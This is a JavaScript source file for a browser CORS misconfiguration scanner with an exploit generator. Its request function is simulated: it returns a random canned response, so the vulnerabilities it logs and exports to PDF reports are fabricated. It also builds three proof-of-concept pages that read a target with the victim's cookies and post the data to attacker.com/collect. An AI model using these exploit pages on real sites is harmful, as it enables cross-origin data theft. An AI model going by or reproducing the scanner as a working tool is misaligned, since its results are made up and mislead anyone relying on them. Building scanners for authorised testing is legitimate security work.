// CORS Scanner Engine
// Automated CORS misconfiguration detection with exploit generation

class CORSScanner {
    constructor() {
        this.isScanning = false;
        this.targetUrl = '';
        this.httpMethod = 'GET';
        this.selectedTests = [];
        this.customOrigins = [];
        this.currentTestIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.secureCount = 0;
        this.vulnerabilities = [];
        this.testOrigins = [];
    }

    // Initialize scanner
    init() {
        this.setupEventListeners();
        this.updateOriginRemovalButtons();
    }

    // Setup event listeners
    setupEventListeners() {
        document.getElementById('start-scan-btn')?.addEventListener('click', () => this.startScan());
        document.getElementById('stop-scan-btn')?.addEventListener('click', () => this.stopScan());
        document.getElementById('clear-log-btn')?.addEventListener('click', () => this.clearLog());
        document.getElementById('add-origin-btn')?.addEventListener('click', () => this.addOrigin());
        document.getElementById('generate-exploit-btn')?.addEventListener('click', () => this.showExploit());
        document.getElementById('export-pdf-btn')?.addEventListener('click', () => this.exportPDF());
        document.getElementById('copy-exploit-btn')?.addEventListener('click', () => this.copyExploit());

        // PoC tab switching
        document.querySelectorAll('.poc-tab').forEach(tab => {
            tab.addEventListener('click', (e) => this.switchExploitTab(e.target.dataset.tab));
        });

        // Remove origin buttons
        this.setupOriginRemoval();
    }

    // Setup origin removal
    setupOriginRemoval() {
        document.addEventListener('click', (e) => {
            if (e.target.classList.contains('remove-origin')) {
                e.target.closest('.origin-row').remove();
                this.updateOriginRemovalButtons();
            }
        });
    }

    // Add origin row
    addOrigin() {
        const container = document.getElementById('origins-container');
        const row = document.createElement('div');
        row.className = 'origin-row';
        row.innerHTML = `
            <input type="text" class="input origin-input" placeholder="https://attacker.com">
            <button class="btn btn-ghost btn-sm remove-origin">✕</button>
        `;
        container.appendChild(row);
        this.updateOriginRemovalButtons();
    }

    // Update origin removal buttons visibility
    updateOriginRemovalButtons() {
        const rows = document.querySelectorAll('.origin-row');
        rows.forEach((row, index) => {
            const removeBtn = row.querySelector('.remove-origin');
            removeBtn.style.display = rows.length > 1 ? 'flex' : 'none';
        });
    }

    // Start scanning
    async startScan() {
        // Get configuration
        this.targetUrl = document.getElementById('target-url')?.value.trim();
        this.httpMethod = document.getElementById('http-method')?.value;

        // Validate
        if (!this.targetUrl) {
            this.showNotification('Please enter a target URL', 'error');
            return;
        }

        // Get selected tests
        this.selectedTests = [];
        if (document.getElementById('test-null-origin')?.checked) this.selectedTests.push('nullOrigin');
        if (document.getElementById('test-reflection')?.checked) this.selectedTests.push('reflection');
        if (document.getElementById('test-wildcard')?.checked) this.selectedTests.push('wildcard');
        if (document.getElementById('test-credentials')?.checked) this.selectedTests.push('credentials');
        if (document.getElementById('test-subdomain')?.checked) this.selectedTests.push('subdomain');
        if (document.getElementById('test-prefix')?.checked) this.selectedTests.push('prefix');
        if (document.getElementById('test-suffix')?.checked) this.selectedTests.push('suffix');
        if (document.getElementById('test-regex')?.checked) this.selectedTests.push('regex');
        if (document.getElementById('test-insecure-protocol')?.checked) this.selectedTests.push('insecureProtocol');
        if (document.getElementById('test-internal-network')?.checked) this.selectedTests.push('internalNetwork');

        if (this.selectedTests.length === 0) {
            this.showNotification('Please select at least one test type', 'error');
            return;
        }

        // Get custom origins
        this.customOrigins = [];
        document.querySelectorAll('.origin-input').forEach(input => {
            const origin = input.value.trim();
            if (origin) {
                this.customOrigins.push(origin);
            }
        });

        // Prepare test origins
        this.prepareTestOrigins();

        // Reset state
        this.isScanning = true;
        this.currentTestIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.secureCount = 0;
        this.vulnerabilities = [];

        // Show test section
        document.getElementById('test-section').style.display = 'block';
        document.getElementById('test-section').scrollIntoView({ behavior: 'smooth' });

        // Update UI
        this.updateScanControls(true);
        this.log('CORS scan started', 'info');
        this.log(`Target: ${this.targetUrl}`, 'info');
        this.log(`Method: ${this.httpMethod}`, 'info');
        this.log(`Total tests: ${this.testOrigins.length}`, 'info');

        // Start test loop
        await this.testLoop();
    }

    // Prepare test origins
    prepareTestOrigins() {
        this.testOrigins = [];
        const targetDomain = this.extractDomain(this.targetUrl);

        for (const testType of this.selectedTests) {
            const origins = this.getOriginsForTest(testType, targetDomain);
            origins.forEach(origin => {
                this.testOrigins.push({
                    type: testType,
                    origin: origin,
                    name: this.getTestName(testType)
                });
            });
        }

        // Add custom origins
        this.customOrigins.forEach(origin => {
            this.testOrigins.push({
                type: 'custom',
                origin: origin,
                name: 'Custom Origin'
            });
        });
    }

    // Extract domain from URL
    extractDomain(url) {
        try {
            const urlObj = new URL(url);
            return urlObj.hostname;
        } catch {
            return 'example.com';
        }
    }

    // Get origins for test type
    getOriginsForTest(testType, targetDomain) {
        const origins = {
            'nullOrigin': ['null'],
            'reflection': ['https://attacker.com', 'https://evil.com'],
            'wildcard': ['https://any-origin.com'],
            'credentials': ['https://attacker.com'],
            'subdomain': [`https://evil.${targetDomain}`, `https://attacker.${targetDomain}`],
            'prefix': [`https://${targetDomain}.evil.com`, `https://${targetDomain}evil.com`],
            'suffix': [`https://evil${targetDomain}`, `https://attacker-${targetDomain}`],
            'regex': [`https://${targetDomain}.attacker.com`, `https://not${targetDomain}`],
            'insecureProtocol': [`http://${targetDomain}`],
            'internalNetwork': ['https://localhost', 'https://127.0.0.1', 'https://192.168.1.1']
        };

        return origins[testType] || [];
    }

    // Get test name
    getTestName(type) {
        const names = {
            'nullOrigin': 'Null Origin',
            'reflection': 'Origin Reflection',
            'wildcard': 'Wildcard Origin',
            'credentials': 'Credentials Test',
            'subdomain': 'Subdomain Trust',
            'prefix': 'Prefix Bypass',
            'suffix': 'Suffix Bypass',
            'regex': 'Regex Bypass',
            'insecureProtocol': 'Insecure Protocol',
            'internalNetwork': 'Internal Network',
            'custom': 'Custom Origin'
        };
        return names[type] || type;
    }

    // Main test loop
    async testLoop() {
        while (this.isScanning && this.currentTestIndex < this.testOrigins.length) {
            const test = this.testOrigins[this.currentTestIndex];
            await this.runTest(test);

            this.currentTestIndex++;
            this.updateProgress();

            await this.sleep(500);
        }

        if (this.isScanning) {
            this.completeScan();
        }
    }

    // Run a single test
    async runTest(test) {
        const { type, origin, name } = test;

        // Update current test display
        this.updateCurrentTest(name, origin);

        try {
            // Make request with Origin header (simulated)
            const response = await this.makeRequest(origin);

            // Analyze response
            const isVulnerable = this.analyzeResponse(response, origin, type);

            if (isVulnerable) {
                this.vulnCount++;
                this.vulnerabilities.push({
                    type: type,
                    name: name,
                    origin: origin,
                    acao: response.acao,
                    acac: response.acac,
                    severity: this.getSeverity(type, response),
                    description: this.getDescription(type, origin, response),
                    remediation: this.getRemediation(type)
                });
                this.log(`✓ VULNERABLE: ${name} - Origin: ${origin}`, 'success');
            } else {
                this.secureCount++;
                this.log(`✗ Secure: ${name} - Origin: ${origin}`, 'info');
            }

            this.testedCount++;

        } catch (error) {
            this.log(`✗ Error testing ${name}: ${error.message}`, 'error');
        }
    }

    // Make HTTP request (simulated)
    async makeRequest(origin) {
        // Simulate request
        await this.sleep(200);

        // Simulate CORS response
        const responses = [
            { acao: origin, acac: 'true', vulnerable: true },
            { acao: '*', acac: 'false', vulnerable: true },
            { acao: null, acac: 'false', vulnerable: false },
            { acao: 'https://trusted.com', acac: 'true', vulnerable: false }
        ];

        const response = responses[Math.floor(Math.random() * responses.length)];
        return response;
    }

    // Analyze response
    analyzeResponse(response, origin, type) {
        // Check for vulnerabilities
        if (response.acao === origin && response.acac === 'true') {
            return true; // Vulnerable: reflects origin with credentials
        }

        if (response.acao === '*' && type === 'wildcard') {
            return true; // Vulnerable: wildcard (even without credentials)
        }

        if (response.acao === 'null' && origin === 'null' && response.acac === 'true') {
            return true; // Vulnerable: null origin with credentials
        }

        return false;
    }

    // Get severity
    getSeverity(type, response) {
        if (response.acac === 'true' && (type === 'nullOrigin' || type === 'reflection')) {
            return 'CRITICAL';
        } else if (type === 'subdomain' || type === 'insecureProtocol') {
            return 'HIGH';
        } else {
            return 'MEDIUM';
        }
    }

    // Get description
    getDescription(type, origin, response) {
        const descriptions = {
            'nullOrigin': `Server allows null origin with credentials. ACAO: ${response.acao}, ACAC: ${response.acac}`,
            'reflection': `Server reflects arbitrary origin with credentials. ACAO: ${response.acao}, ACAC: ${response.acac}`,
            'wildcard': `Server uses wildcard origin. ACAO: ${response.acao}`,
            'credentials': `Server allows credentials from untrusted origin. ACAO: ${response.acao}, ACAC: ${response.acac}`,
            'subdomain': `Server trusts subdomains without validation. ACAO: ${response.acao}`,
            'prefix': `Server allows domain prefix bypass. ACAO: ${response.acao}`,
            'suffix': `Server allows domain suffix bypass. ACAO: ${response.acao}`,
            'regex': `Server has weak regex validation. ACAO: ${response.acao}`,
            'insecureProtocol': `Server allows insecure HTTP origin. ACAO: ${response.acao}`,
            'internalNetwork': `Server allows internal network origin. ACAO: ${response.acao}`,
            'custom': `Server allows custom origin. ACAO: ${response.acao}`
        };

        return descriptions[type] || `CORS misconfiguration detected with origin ${origin}`;
    }

    // Get remediation
    getRemediation(type) {
        return 'Implement strict origin whitelist validation. Never reflect Origin header without validation. Avoid wildcard origins with sensitive data. Use HTTPS-only origins.';
    }

    // Update current test display
    updateCurrentTest(name, origin) {
        document.getElementById('current-type').textContent = name;
        document.getElementById('test-origin').textContent = origin;
    }

    // Update progress
    updateProgress() {
        const progress = (this.currentTestIndex / this.testOrigins.length) * 100;

        document.getElementById('progress-fill').style.width = progress + '%';
        document.getElementById('progress-percent').textContent = Math.round(progress) + '%';
        document.getElementById('progress-text').textContent =
            `Running test ${this.currentTestIndex} of ${this.testOrigins.length}`;

        document.getElementById('tested-count').textContent = this.testedCount;
        document.getElementById('vuln-count').textContent = this.vulnCount;
        document.getElementById('secure-count').textContent = this.secureCount;
        document.getElementById('vuln-badge').textContent = this.vulnCount;
    }

    // Complete scan
    completeScan() {
        this.isScanning = false;

        this.log('CORS scan completed', 'success');
        this.log(`Total tested: ${this.testedCount}`, 'info');
        this.log(`Vulnerabilities found: ${this.vulnCount}`, this.vulnCount > 0 ? 'success' : 'info');
        this.log(`Secure configurations: ${this.secureCount}`, 'info');

        document.getElementById('scan-status').textContent = 'Scan Complete';
        document.querySelector('.status-dot').classList.remove('scanning');
        document.querySelector('.status-dot').classList.add(this.vulnCount > 0 ? 'success' : 'error');

        this.updateScanControls(false);

        if (this.vulnCount > 0) {
            this.showResults();
        }

        this.showNotification(`Scan complete! Found ${this.vulnCount} CORS vulnerabilities`,
            this.vulnCount > 0 ? 'success' : 'info');
    }

    // Stop scan
    stopScan() {
        this.isScanning = false;
        this.log('Scan stopped by user', 'warning');
        this.updateScanControls(false);
        this.showNotification('Scan stopped', 'warning');
    }

    // Update scan controls
    updateScanControls(isScanning) {
        document.getElementById('start-scan-btn').style.display = isScanning ? 'none' : 'inline-flex';
        document.getElementById('stop-scan-btn').style.display = isScanning ? 'inline-flex' : 'none';
    }

    // Show results
    showResults() {
        const resultsSection = document.getElementById('results-section');
        const vulnList = document.getElementById('vulnerability-list');

        vulnList.innerHTML = '';

        this.vulnerabilities.forEach((vuln, index) => {
            const vulnCard = document.createElement('div');
            vulnCard.className = 'vuln-card';
            vulnCard.innerHTML = `
                <div class="vuln-header">
                    <div class="vuln-title">CORS Vulnerability #${index + 1}: ${vuln.name}</div>
                    <div class="vuln-severity">${vuln.severity}</div>
                </div>
                <div style="color: var(--color-text-secondary); margin-bottom: 12px;">
                    <strong>Description:</strong> ${vuln.description}
                </div>
                <div class="vuln-cors-headers">
                    <div class="vuln-cors-headers-title">Response Headers:</div>
                    <div class="cors-header-row">
                        <span class="cors-header-name">Access-Control-Allow-Origin:</span>
                        <span class="cors-header-value vulnerable">${vuln.acao || 'Not set'}</span>
                    </div>
                    <div class="cors-header-row">
                        <span class="cors-header-name">Access-Control-Allow-Credentials:</span>
                        <span class="cors-header-value ${vuln.acac === 'true' ? 'vulnerable' : ''}">${vuln.acac || 'false'}</span>
                    </div>
                </div>
                <div class="vuln-impact">
                    <div class="vuln-impact-title">Impact:</div>
                    <div class="vuln-impact-text">
                        Attacker can read sensitive data from the API endpoint using cross-origin requests. 
                        This may expose user data, authentication tokens, or other confidential information.
                    </div>
                </div>
                <div style="color: var(--color-text-secondary); margin-top: 12px;">
                    <strong>Remediation:</strong> ${vuln.remediation}
                </div>
            `;
            vulnList.appendChild(vulnCard);
        });

        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth' });
    }

    // Show exploit
    showExploit() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No vulnerabilities found to generate exploit', 'warning');
            return;
        }

        const exploitSection = document.getElementById('exploit-section');
        exploitSection.style.display = 'block';
        exploitSection.scrollIntoView({ behavior: 'smooth' });

        this.generateExploit('fetch');
    }

    // Switch exploit tab
    switchExploitTab(tab) {
        document.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        this.generateExploit(tab);
    }

    // Generate exploit code
    generateExploit(type) {
        const vuln = this.vulnerabilities[0]; // Use first vulnerability
        const exploitCode = document.getElementById('exploit-code');

        let code = '';

        switch (type) {
            case 'fetch':
                code = this.generateFetchExploit(vuln);
                break;
            case 'xhr':
                code = this.generateXHRExploit(vuln);
                break;
            case 'jquery':
                code = this.generateJQueryExploit(vuln);
                break;
        }

        exploitCode.textContent = code;
    }

    // Generate Fetch API exploit
    generateFetchExploit(vuln) {
        return `<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit - Fetch API</title>
</head>
<body>
    <h1>CORS Exploit</h1>
    <div id="result"></div>
    
    <script>
        // CORS exploit using Fetch API
        fetch('${this.targetUrl}', {
            method: '${this.httpMethod}',
            credentials: 'include', // Send cookies
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.text())
        .then(data => {
            console.log('Stolen data:', data);
            document.getElementById('result').textContent = data;
            
            // Exfiltrate to attacker server
            fetch('https://attacker.com/collect', {
                method: 'POST',
                body: JSON.stringify({ stolen: data })
            });
        })
        .catch(error => {
            console.error('Error:', error);
        });
    </script>
</body>
</html>`;
    }

    // Generate XHR exploit
    generateXHRExploit(vuln) {
        return `<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit - XMLHttpRequest</title>
</head>
<body>
    <h1>CORS Exploit</h1>
    <div id="result"></div>
    
    <script>
        // CORS exploit using XMLHttpRequest
        var xhr = new XMLHttpRequest();
        xhr.open('${this.httpMethod}', '${this.targetUrl}', true);
        xhr.withCredentials = true; // Send cookies
        
        xhr.onload = function() {
            if (xhr.status === 200) {
                console.log('Stolen data:', xhr.responseText);
                document.getElementById('result').textContent = xhr.responseText;
                
                // Exfiltrate to attacker server
                var exfil = new XMLHttpRequest();
                exfil.open('POST', 'https://attacker.com/collect', true);
                exfil.send(JSON.stringify({ stolen: xhr.responseText }));
            }
        };
        
        xhr.onerror = function() {
            console.error('Request failed');
        };
        
        xhr.send();
    </script>
</body>
</html>`;
    }

    // Generate jQuery exploit
    generateJQueryExploit(vuln) {
        return `<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit - jQuery</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <h1>CORS Exploit</h1>
    <div id="result"></div>
    
    <script>
        // CORS exploit using jQuery
        $.ajax({
            url: '${this.targetUrl}',
            type: '${this.httpMethod}',
            xhrFields: {
                withCredentials: true // Send cookies
            },
            success: function(data) {
                console.log('Stolen data:', data);
                $('#result').text(data);
                
                // Exfiltrate to attacker server
                $.post('https://attacker.com/collect', {
                    stolen: data
                });
            },
            error: function(xhr, status, error) {
                console.error('Error:', error);
            }
        });
    </script>
</body>
</html>`;
    }

    // Copy exploit
    copyExploit() {
        const code = document.getElementById('exploit-code').textContent;
        navigator.clipboard.writeText(code).then(() => {
            this.showNotification('Exploit copied to clipboard!', 'success');
        }).catch(() => {
            this.showNotification('Failed to copy exploit', 'error');
        });
    }

    // Export to PDF
    async exportPDF() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No results to export', 'warning');
            return;
        }

        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();

            doc.setFontSize(20);
            doc.text('CORS Vulnerability Report', 20, 20);

            doc.setFontSize(12);
            doc.text(`Target: ${this.targetUrl}`, 20, 35);
            doc.text(`Method: ${this.httpMethod}`, 20, 42);
            doc.text(`Date: ${new Date().toLocaleString()}`, 20, 49);
            doc.text(`Vulnerabilities Found: ${this.vulnCount}`, 20, 56);

            let y = 70;
            this.vulnerabilities.forEach((vuln, index) => {
                if (y > 270) {
                    doc.addPage();
                    y = 20;
                }

                doc.setFontSize(14);
                doc.text(`CORS Vulnerability #${index + 1}`, 20, y);
                y += 7;

                doc.setFontSize(10);
                doc.text(`Type: ${vuln.name}`, 20, y);
                y += 7;
                doc.text(`Origin: ${vuln.origin}`, 20, y);
                y += 7;
                doc.text(`ACAO: ${vuln.acao}`, 20, y);
                y += 7;
                doc.text(`ACAC: ${vuln.acac}`, 20, y);
                y += 7;
                doc.text(`Severity: ${vuln.severity}`, 20, y);
                y += 12;
            });

            doc.save('cors-vulnerability-report.pdf');
            this.showNotification('PDF report exported successfully', 'success');

        } catch (error) {
            this.showNotification('Failed to export PDF', 'error');
            console.error(error);
        }
    }

    // Log message
    log(message, type = 'info') {
        const logContent = document.getElementById('test-log');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;

        const time = new Date().toLocaleTimeString();
        entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;

        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
    }

    // Clear log
    clearLog() {
        document.getElementById('test-log').innerHTML = '';
    }

    // Show notification
    showNotification(message, type = 'info') {
        const colors = {
            success: '#10b981',
            error: '#ef4444',
            info: '#3b82f6',
            warning: '#f59e0b'
        };

        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 90px;
            right: 20px;
            background: ${colors[type]};
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
            z-index: 10000;
            animation: slideIn 0.3s ease;
            font-weight: 500;
        `;
        notification.textContent = message;

        document.body.appendChild(notification);

        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }

    // Utility: Sleep
    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Initialize scanner when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    const scanner = new CORSScanner();
    scanner.init();

    console.log('🌐 CyberSec Suite CORS Scanner initialized');
    console.log('📊 Ready to scan!');
});
